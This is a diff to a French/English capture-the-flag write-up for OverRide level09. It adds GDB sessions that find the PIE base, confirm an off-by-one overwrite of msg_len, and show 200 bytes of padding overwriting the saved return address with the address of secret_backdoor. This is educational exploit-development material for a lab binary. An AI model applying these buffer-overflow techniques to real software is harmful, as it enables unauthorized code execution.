@@ -105,10 +105,22 @@ On the OverRide VM (ASLR disabled), the PIE base is `0x555555554000`:
 ```
 (gdb) break main
 (gdb) run
+
+Breakpoint 1, 0x000055555555488c in main ()
+
 (gdb) info proc mappings
+process 3210
+Mapped address spaces:
+
+    Start Addr           End Addr       Size     Offset objfile
+0x555555554000     0x555555555000     0x1000        0x0 /home/users/level09/level09
+0x555555755000     0x555555756000     0x1000        0x0 /home/users/level09/level09
+0x555555756000     0x555555757000     0x1000     0x1000 /home/users/level09/level09
+0x7ffff7a15000     0x7ffff7bcf000   0x1ba000        0x0 /lib/x86_64-linux-gnu/libc-2.15.so
+...
 ```
 
-Look for the `level09` line with `r-xp` permissions — the start address is the PIE base.
+La première ligne avec l'offset `0x0` et le binaire `level09` donne la PIE base : **`0x555555554000`**.
 
 ```
 target = 0x555555554000 + 0x88c = 0x55555555488c
@@ -138,6 +150,43 @@ The exploit sends 3 lines to stdin:
 - padding = 8 bytes (0xb8–0xbf)
 - saved RBP = 8 bytes (0xc0–0xc7)
 - **Total before saved RIP = 200 bytes**
+
+### Vérification de l'off-by-one dans GDB
+
+On confirme que le 41e octet du username écrase bien `msg_len` :
+
+```
+(gdb) b *0x0000555555554910                  ← callq set_username (dans handle_msg)
+(gdb) run
+>: Enter your username
+>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xff
+
+(gdb) b *0x000055555555491f                  ← callq set_msg (juste après set_username)
+(gdb) continue
+
+Breakpoint 2, 0x000055555555491f in handle_msg ()
+
+(gdb) x/wx $rbp-0xc                         ← msg_len (offset 0xb4 dans la structure)
+0x7fffffffe4f4: 0x000000ff                   ← msg_len = 255 (au lieu de 0x8c = 140)
+```
+
+`msg_len` est passé de `0x8c` (140) à `0xff` (255) grâce au 41e octet `\xff`.
+
+### Vérification du padding (200 bytes) au moment du ret
+
+```
+(gdb) b *0x0000555555554931                  ← retq de handle_msg
+(gdb) continue
+>: Msg @Unix-Dude
+>>: AAAA...  (200 'A' + adresse)
+
+Breakpoint 3, 0x0000555555554931 in handle_msg ()
+
+(gdb) x/2gx $rsp                            ← saved RIP est au sommet de la stack au ret
+0x7fffffffe508: 0x000055555555488c 0x...     ← RIP = secret_backdoor ✓
+```
+
+Le saved RIP est bien écrasé par `0x55555555488c` (adresse de `secret_backdoor`).
 
 ---
 
